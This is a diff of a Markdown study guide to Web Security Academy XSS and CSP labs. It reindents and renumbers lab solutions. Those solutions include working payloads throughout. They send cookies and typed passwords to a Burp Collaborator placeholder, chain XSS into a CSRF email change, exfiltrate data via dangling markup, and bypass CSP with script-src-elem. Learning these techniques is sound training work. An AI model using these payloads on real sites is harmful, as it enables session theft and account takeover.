@@ -2597,11 +2597,11 @@ Content-Type: application/json
    - Post comment and capture the session value in Burp Collaborator   
      ```
      <script>
-	fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
+     fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
 	  method: 'POST',
 	  mode: 'no-cors',
 	  body:document.cookie
-	});
+     });
      </script>
      ```
 2. Exploiting cross-site scripting to **capture passwords**  
@@ -2609,11 +2609,11 @@ Content-Type: application/json
    - Post comment and capture the password value in Burp Collaborator
      ```
      <input name=username id=username>
-     <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
-	method:'POST',
-	mode: 'no-cors',
-	body:username.value+':'+this.value
-	});">
+     <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{ 
+	  method:'POST',
+	  mode: 'no-cors',
+	  body:username.value+':'+this.value
+	  });">
      ```
 3. Exploiting XSS to perform **CSRF**
    - Extract the CSRF token and change the victim's email address
@@ -2624,17 +2624,17 @@ Content-Type: application/json
      email=test%40normal-user.net&csrf=ZqNZdY3eSqvBYHiuBgDUiRAkX3OJ0Xw0
   
      <script>
-	var req = new XMLHttpRequest();
-	req.onload = handleResponse;
-	req.open('get','/my-account',true);
-	req.send();
-	function handleResponse() {
-	    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
-	    var changeReq = new XMLHttpRequest();
-	    changeReq.open('post', '/my-account/change-email', true);
-	    changeReq.send('csrf='+token+'&email=test@test.com')
-	};
-      </script>
+	 var req = new XMLHttpRequest();
+	 req.onload = handleResponse;
+	 req.open('get','/my-account',true);
+	 req.send();
+	 function handleResponse() {
+	      var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+	      var changeReq = new XMLHttpRequest();
+	      changeReq.open('post', '/my-account/change-email', true);
+	      changeReq.send('csrf='+token+'&email=test@test.com')
+	 };
+     </script>
       ```
 **Content security policy (CSP)**
 1. Reflected XSS protected by very **strict CSP**, with **dangling markup attack**
@@ -2649,26 +2649,26 @@ Content-Type: application/json
      ```
      Burp
      <script>
-	if(window.name) {
-			new Image().src='//BURP-COLLABORATOR-SUBDOMAIN?'+encodeURIComponent(window.name);
-			} else {
-	     			location = 'https://YOUR-LAB-ID.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27';
-	}
+      if(window.name) {
+	  new Image().src='//BURP-COLLABORATOR-SUBDOMAIN?'+encodeURIComponent(window.name);
+      } else {
+	  location = 'https://YOUR-LAB-ID.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27';  
+      }
      </script>
-
+     
      Solution
      <script>
-	location='https://YOUR-LAB-ID.web-security-academy.net/my-account?email="></form><form class="login_form" name="myform" action="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit" method="GET"><button class="button" type="submit">Click</button';
+	 location='https://YOUR-LAB-ID.web-security-academy.net/my-account?email="></form><form class="login_form" name="myform" action="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit" method="GET"><button class="button" type="submit">Click</button';
      </script>
      ```
    - Access log, copy the CSRF token
    - Generate CSRF PoC and replace the CSRF token
-2. Reflected XSS protected by CSP, with **CSP bypass**
-   - The injection uses the `script-src-elem` directive in CSP. This directive allows you to target just script elements. Using this directive, you can overwrite existing script-src rules enabling you to inject `unsafe-inline`, which allows you to use inline scripts.   - Observe the response
+3. Reflected XSS protected by CSP, with **CSP bypass**
+   - The injection uses the `script-src-elem` directive in CSP. This directive allows you to target just script elements. Using this directive, you can overwrite existing script-src rules enabling you to inject `unsafe-inline`, which allows you to use inline scripts.   - Observe the response  
      ```
      GET /?search=%3Cimg+src%3D1+onerror%3Dalert%281%29%3E
 
-     Content-Security-Policy: default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=
+     Content-Security-Policy: default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=  
      ```
    - browse the url `https://YOUR-LAB-ID.web-security-academy.net/?search=<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'`
 
